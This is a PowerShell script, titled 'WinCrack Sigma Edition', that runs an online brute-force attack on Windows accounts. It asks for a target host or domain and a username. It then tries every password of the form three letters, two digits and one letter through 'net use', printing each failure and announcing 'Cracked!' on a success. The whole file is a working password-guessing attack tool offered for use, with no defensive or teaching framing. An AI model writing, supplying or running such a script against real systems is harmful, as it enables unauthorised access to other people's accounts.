# ==============================
# 🟢 LLLNNL Windows Password Tester
# ==============================

[console]::Title = "WinCrack Sigma Edition"
[console]::ForegroundColor = 'green'

# Arrays for letters and numbers
[string[]]$letters = 'a'..'z'
[int[]]$numbers = 0..9

function Test-LLLNNLPassword {
    param (
        [string]$domain,
        [string]$username
    )

    Write-Host "Starting LLLNNL password sweep for $username@$domain..." -ForegroundColor Cyan

    foreach ($l1 in $letters) {
        foreach ($l2 in $letters) {
            foreach ($l3 in $letters) {
                foreach ($n1 in $numbers) {
                    foreach ($n2 in $numbers) {
                        foreach ($l4 in $letters) {
                            $password = "$l1$l2$l3$n1$n2$l4"
                            # Sigma rizz attempt using net use
                            $cmd = "net use \\$domain /user:$username $password"
                            try {
                                $output = cmd /c $cmd 2>&1
                                if ($LASTEXITCODE -eq 0) {
                                    Write-Host "[DONE] Cracked! $username:$password" -ForegroundColor Green
                                    return
                                } else {
                                    Write-Host "Failed: $password" -ForegroundColor DarkCyan
                                }
                            } catch {
                                Write-Host "Error testing $password" -ForegroundColor Red
                            }
                        }
                    }
                }
            }
        }
    }
    Write-Host "Finished sweep. No luck..." -ForegroundColor Yellow
}

# Prompt for target
$dom = Read-Host "Enter domain or host"
$user = Read-Host "Enter username"

# Start the sweep
Test-LLLNNLPassword -domain $dom -username $user
